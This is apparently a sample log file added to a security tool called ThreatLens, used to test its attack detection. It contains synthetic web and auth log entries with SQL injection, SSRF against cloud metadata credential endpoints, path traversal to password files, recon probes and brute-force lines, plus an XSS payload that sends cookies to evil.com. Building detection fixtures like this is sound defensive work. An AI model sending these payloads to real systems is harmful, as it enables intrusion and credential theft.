@@ -1,0 +1,78 @@
+# ThreatLens Sample Attack Log File
+# Upload this file via the dashboard (auto-detects as "nginx" or use "auth" for the sshd lines)
+# Contains: SQLi, SSRF, XSS, Path Traversal, Brute Force, Priv Esc, Recon, and benign traffic
+# ─────────────────────────────────────────────────────────────────────────────
+
+# ── BENIGN TRAFFIC (baseline noise) ──────────────────────────────────────────
+127.0.0.1 - - [23/May/2026:08:00:01 +0000] "GET /index.html HTTP/1.1" 200 4524 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+10.0.0.5 - - [23/May/2026:08:00:15 +0000] "GET /static/logo.png HTTP/1.1" 200 18200 "-" "Mozilla/5.0"
+10.0.0.5 - - [23/May/2026:08:00:30 +0000] "POST /api/login HTTP/1.1" 200 256 "-" "Mozilla/5.0"
+192.168.1.20 - - [23/May/2026:08:01:00 +0000] "GET /dashboard HTTP/1.1" 200 9812 "-" "Mozilla/5.0"
+
+# ── SQL INJECTION ─────────────────────────────────────────────────────────────
+198.51.100.12 - - [23/May/2026:08:05:10 +0000] "GET /api/users?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 400 512 "-" "sqlmap/1.7"
+198.51.100.12 - - [23/May/2026:08:05:12 +0000] "GET /products?category=shoes%27%20OR%201=1-- HTTP/1.1" 400 324 "-" "sqlmap/1.7"
+198.51.100.12 - - [23/May/2026:08:05:14 +0000] "GET /search?q=%27%3B%20DROP%20TABLE%20users%3B-- HTTP/1.1" 400 256 "-" "sqlmap/1.7"
+198.51.100.12 - - [23/May/2026:08:05:16 +0000] "GET /api/orders?filter=1%20AND%20SLEEP(5) HTTP/1.1" 200 0 "-" "sqlmap/1.7"
+198.51.100.12 - - [23/May/2026:08:05:18 +0000] "GET /admin?id=1%20AND%20(SELECT%20*%20FROM%20information_schema.tables) HTTP/1.1" 500 128 "-" "sqlmap/1.7"
+
+# ── SSRF (Server-Side Request Forgery) ───────────────────────────────────────
+203.0.113.99 - - [23/May/2026:08:10:20 +0000] "GET /api/proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
+203.0.113.99 - - [23/May/2026:08:10:22 +0000] "GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1" 200 488 "-" "Mozilla/5.0"
+203.0.113.99 - - [23/May/2026:08:10:25 +0000] "GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ HTTP/1.1" 200 312 "-" "Mozilla/5.0"
+203.0.113.99 - - [23/May/2026:08:10:28 +0000] "GET /webhook?target=http://169.254.169.254/latest/user-data HTTP/1.1" 200 768 "-" "curl/7.88"
+
+# ── XSS (Cross-Site Scripting) ────────────────────────────────────────────────
+45.33.32.156 - - [23/May/2026:08:15:05 +0000] "GET /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1" 400 256 "-" "Mozilla/5.0"
+45.33.32.156 - - [23/May/2026:08:15:08 +0000] "POST /comment HTTP/1.1" 400 128 "-" "Mozilla/5.0"
+45.33.32.156 - - [23/May/2026:08:15:11 +0000] "GET /profile?name=<img+src=x+onerror=alert(document.domain)> HTTP/1.1" 400 196 "-" "Mozilla/5.0"
+45.33.32.156 - - [23/May/2026:08:15:14 +0000] "GET /redirect?url=javascript:eval(atob('YWxlcnQoMSk=')) HTTP/1.1" 302 0 "-" "Mozilla/5.0"
+
+# ── PATH TRAVERSAL ────────────────────────────────────────────────────────────
+192.0.2.77 - - [23/May/2026:08:20:30 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 400 256 "-" "Mozilla/5.0"
+192.0.2.77 - - [23/May/2026:08:20:33 +0000] "GET /files/..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 128 "-" "Mozilla/5.0"
+192.0.2.77 - - [23/May/2026:08:20:36 +0000] "GET /static/%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1" 400 196 "-" "Mozilla/5.0"
+192.0.2.77 - - [23/May/2026:08:20:39 +0000] "GET /read?path=/proc/self/environ HTTP/1.1" 403 64 "-" "curl/7.88"
+192.0.2.77 - - [23/May/2026:08:20:42 +0000] "GET /config?file=..\..\..\..\Windows\win.ini HTTP/1.1" 400 128 "-" "Mozilla/5.0"
+
+# ── SSH BRUTE FORCE (auth log format — use "auth" source type for these) ─────
+May 23 08:25:01 prod-server sshd[12345]: Failed password for invalid user admin from 203.0.113.42 port 54321 ssh2
+May 23 08:25:02 prod-server sshd[12345]: Failed password for invalid user admin from 203.0.113.42 port 54322 ssh2
+May 23 08:25:03 prod-server sshd[12345]: Failed password for invalid user admin from 203.0.113.42 port 54323 ssh2
+May 23 08:25:04 prod-server sshd[12345]: Failed password for invalid user admin from 203.0.113.42 port 54324 ssh2
+May 23 08:25:05 prod-server sshd[12345]: Failed password for invalid user admin from 203.0.113.42 port 54325 ssh2
+May 23 08:25:06 prod-server sshd[12345]: Failed password for invalid user root from 203.0.113.42 port 54326 ssh2
+May 23 08:25:07 prod-server sshd[12345]: Failed password for invalid user root from 203.0.113.42 port 54327 ssh2
+May 23 08:25:08 prod-server sshd[12345]: Failed password for invalid user root from 203.0.113.42 port 54328 ssh2
+May 23 08:25:09 prod-server sshd[12345]: Failed password for invalid user ubuntu from 203.0.113.42 port 54329 ssh2
+May 23 08:25:10 prod-server sshd[12345]: Failed password for invalid user ubuntu from 203.0.113.42 port 54330 ssh2
+May 23 08:25:15 prod-server sshd[12345]: Failed password for invalid user pi from 203.0.113.42 port 54331 ssh2
+May 23 08:25:20 prod-server sshd[99999]: Accepted password for root from 203.0.113.42 port 54332 ssh2
+
+# ── PRIVILEGE ESCALATION (auth log format) ────────────────────────────────────
+May 23 08:30:00 prod-server sudo: pam_unix(sudo:auth): authentication failure; logname= uid=1001 euid=0 ruser=developer rhost= user=root
+May 23 08:30:10 prod-server su: pam_unix(su:auth): failed su for root by developer
+May 23 08:30:20 prod-server sudo: developer : TTY=pts/1 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/bash
+May 23 08:30:25 prod-server sudo: pam_unix(sudo:auth): authentication failure; logname= uid=1002 euid=0 ruser=jenkins rhost= user=root
+
+# ── RECON / SCANNING (AI classifier territory) ────────────────────────────────
+203.0.113.42 - - [23/May/2026:08:35:00 +0000] "GET /wp-login.php HTTP/1.1" 404 196 "-" "Mozilla/5.0"
+203.0.113.42 - - [23/May/2026:08:35:01 +0000] "GET /wp-admin/ HTTP/1.1" 404 196 "-" "Mozilla/5.0"
+203.0.113.42 - - [23/May/2026:08:35:02 +0000] "GET /.env HTTP/1.1" 403 64 "-" "Mozilla/5.0"
+203.0.113.42 - - [23/May/2026:08:35:03 +0000] "GET /.git/config HTTP/1.1" 403 64 "-" "Mozilla/5.0"
+203.0.113.42 - - [23/May/2026:08:35:04 +0000] "GET /phpinfo.php HTTP/1.1" 404 196 "-" "Mozilla/5.0"
+203.0.113.42 - - [23/May/2026:08:35:05 +0000] "GET /api/v1/swagger.json HTTP/1.1" 200 18432 "-" "Mozilla/5.0"
+203.0.113.42 - - [23/May/2026:08:35:06 +0000] "GET /actuator/env HTTP/1.1" 404 64 "-" "Mozilla/5.0"
+203.0.113.42 - - [23/May/2026:08:35:07 +0000] "GET /admin/config HTTP/1.1" 401 128 "-" "Mozilla/5.0"
+
+# ── CREDENTIAL STUFFING (AI classifier territory) ─────────────────────────────
+185.220.101.1 - - [23/May/2026:08:40:00 +0000] "POST /api/login HTTP/1.1" 401 64 "-" "python-requests/2.28"
+185.220.101.1 - - [23/May/2026:08:40:01 +0000] "POST /api/login HTTP/1.1" 401 64 "-" "python-requests/2.28"
+185.220.101.1 - - [23/May/2026:08:40:02 +0000] "POST /api/login HTTP/1.1" 401 64 "-" "python-requests/2.28"
+185.220.101.1 - - [23/May/2026:08:40:03 +0000] "POST /api/login HTTP/1.1" 401 64 "-" "python-requests/2.28"
+185.220.101.1 - - [23/May/2026:08:40:04 +0000] "POST /api/login HTTP/1.1" 200 512 "-" "python-requests/2.28"
+
+# ── MORE BENIGN TRAFFIC (to test false positive rate) ────────────────────────
+10.0.0.10 - - [23/May/2026:08:45:00 +0000] "GET /api/products HTTP/1.1" 200 4096 "-" "Mozilla/5.0"
+10.0.0.10 - - [23/May/2026:08:45:10 +0000] "POST /api/cart HTTP/1.1" 200 256 "-" "Mozilla/5.0"
+10.0.0.11 - - [23/May/2026:08:45:20 +0000] "GET /api/orders/12345 HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
